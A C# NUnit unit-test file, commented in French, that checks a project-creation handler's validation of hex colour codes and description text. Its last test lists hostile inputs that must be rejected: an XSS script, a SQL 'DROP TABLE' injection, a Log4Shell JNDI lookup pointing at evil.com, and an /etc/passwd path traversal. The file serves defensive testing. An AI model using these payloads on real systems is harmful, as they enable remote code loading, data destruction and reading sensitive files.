using NUnit.Framework;
using Application.Projects;
using Domain.Interfaces;
using Moq;

namespace Application.UnitTests.Projects;

[TestFixture]
public class CreateProjectColorValidationTests
{
    private Mock<IProjectRepository> _projectRepositoryMock;
    private CreateProjectHandler _handler;

    [SetUp]
    public void SetUp()
    {
        _projectRepositoryMock = new Mock<IProjectRepository>();
        _handler = new CreateProjectHandler(_projectRepositoryMock.Object);
    }

    [Test]
    [TestCase("#FF0000")] // Rouge valide
    [TestCase("#00FF00")] // Vert valide
    [TestCase("#0000FF")] // Bleu valide
    [TestCase("#FFFFFF")] // Blanc valide
    [TestCase("#000000")] // Noir valide
    [TestCase("#ABC123")] // Couleur mixte valide
    public void Handle_ShouldAcceptValidHexColors(string validColor)
    {
        // Arrange
        var request = new CreateProject
        {
            Name = "Test Project",
            Description = "Test description",
            Color = validColor
        };

        // Act & Assert - Ne doit pas lever d'exception
        Assert.DoesNotThrowAsync(() => _handler.Handle(request, CancellationToken.None));
    }

    [Test]
    [TestCase("FF0000")]        // Sans #
    [TestCase("#GG0000")]       // Caractères invalides
    [TestCase("#FF00")]         // Trop court
    [TestCase("#FF000000")]     // Trop long
    [TestCase("red")]           // Nom de couleur
    [TestCase("#FF-000")]       // Tiret
    [TestCase("<script>")]      // Tentative XSS
    [TestCase("'; DROP TABLE")] // Tentative SQL injection
    [TestCase("#FF\x00\x00\x00")] // Caractères null
    public void Handle_ShouldRejectInvalidHexColors(string invalidColor)
    {
        // Arrange
        var request = new CreateProject
        {
            Name = "Test Project",
            Description = "Test description",
            Color = invalidColor
        };

        // Act & Assert
        var exception = Assert.ThrowsAsync<ArgumentException>(
            () => _handler.Handle(request, CancellationToken.None)
        );
        
        Assert.That(exception.Message, Does.Contain("Color"));
        Assert.That(exception.Message, Does.Contain("valid hex"));
    }

    [Test]
    public void Handle_ShouldAcceptNullColor()
    {
        // Arrange
        var request = new CreateProject
        {
            Name = "Test Project",
            Description = "Test description",
            Color = null // Couleur nulle devrait être acceptée
        };

        // Act & Assert - Ne doit pas lever d'exception
        Assert.DoesNotThrowAsync(() => _handler.Handle(request, CancellationToken.None));
    }

    [Test]
    [TestCase("<script>alert('xss')</script>")]
    [TestCase("'; DROP TABLE Projects; --")]
    [TestCase("${jndi:ldap://evil.com/a}")]
    [TestCase("../../etc/passwd")]
    [TestCase("%3Cscript%3E")]
    public void Handle_ShouldRejectMaliciousInput_InDescription(string maliciousInput)
    {
        // Arrange
        var request = new CreateProject
        {
            Name = "Test Project",
            Description = maliciousInput,
            Color = "#FF0000"
        };

        // Act & Assert
        var exception = Assert.ThrowsAsync<ArgumentException>(
            () => _handler.Handle(request, CancellationToken.None)
        );
        
        Assert.That(exception.Message, Does.Contain("invalid characters"));
    }
}
